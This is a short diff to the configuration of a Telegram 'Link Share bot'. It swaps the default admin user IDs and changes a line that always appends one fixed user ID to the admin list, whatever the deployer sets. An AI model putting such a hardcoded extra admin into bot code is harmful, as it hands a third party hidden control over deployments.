@@ -56,14 +56,14 @@ ABOUT_TXT = """<b>›› ᴍʏ ɴᴀᴍᴇ: <b> Link Share bot </b>
 
 try:
     ADMINS = []
-    for x in (os.environ.get("ADMINS", "7993998594 6497757690 5585016974").split()):
+    for x in (os.environ.get("ADMINS", "7889947993").split()):
         ADMINS.append(int(x))
 except ValueError:
     raise Exception("Your Admins list does not contain valid integers.")
 
 # Admin == OWNER_ID
 ADMINS.append(OWNER_ID)
-ADMINS.append(6497757690)
+ADMINS.append(7889947993)
 
 # Default
 BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
